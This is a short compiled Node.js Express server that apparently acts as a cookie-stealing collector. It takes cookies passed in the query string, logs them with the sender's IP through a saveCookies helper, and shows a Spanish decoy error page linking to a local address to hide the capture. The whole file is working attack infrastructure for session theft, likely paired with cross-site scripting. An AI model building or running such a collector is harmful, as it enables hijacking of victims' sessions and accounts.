"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
const cors_1 = __importDefault(require("cors"));
const save_cookies_1 = require("./save-cookies");
const app = (0, express_1.default)();
const port = 3000;
const host = '0.0.0.0';
app.use((0, cors_1.default)());
app.use(express_1.default.json());
app.get('/', (req, res) => {
    var _a;
    const ip = (_a = req.ip) !== null && _a !== void 0 ? _a : '127.0.0.1';
    const cookies = req.query.cookies;
    (0, save_cookies_1.saveCookies)(ip, cookies);
    res.send(`
    <a href='http://192.168.100.14/'>
      <h1>
        Error, regresar a la página principal
      </h1>
    </a>
  `);
});
app.listen(port, () => {
    console.log(`Servidor Express corriendo en http://${host}:${port}`);
});
